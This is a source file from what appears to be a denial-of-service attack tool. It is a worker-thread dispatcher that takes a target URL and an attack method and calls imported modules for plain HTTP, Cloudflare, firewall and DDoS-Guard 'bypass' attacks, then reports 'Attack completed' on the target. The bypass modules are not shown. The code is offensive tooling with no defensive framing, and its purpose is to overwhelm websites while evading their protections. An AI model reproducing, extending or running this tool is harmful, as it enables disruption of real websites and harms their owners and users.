import { parentPort, workerData } from 'worker_threads';
import { httpBypass } from './bypass/httpBypass';
import { cloudflareBypass } from './bypass/cloudflare';
import { firewallBypass } from './bypass/firewall';
import { ddosGuardBypass } from './bypass/ddosGuard';

const { targetUrl, method } = workerData;

async function runAttack() {
    switch (method) {
        case 'http/bypass':
            await httpBypass(targetUrl);
            break;
        case 'cloudflare':
            await cloudflareBypass(targetUrl);
            break;
        case 'firewall':
            await firewallBypass(targetUrl);
            break;
        case 'ddos-guard':
            await ddosGuardBypass(targetUrl);
            break;
        default:
            parentPort?.postMessage('Invalid attack method');
            break;
    }
}

runAttack().then(() => {
    parentPort?.postMessage(`Attack completed on ${targetUrl}`);
});
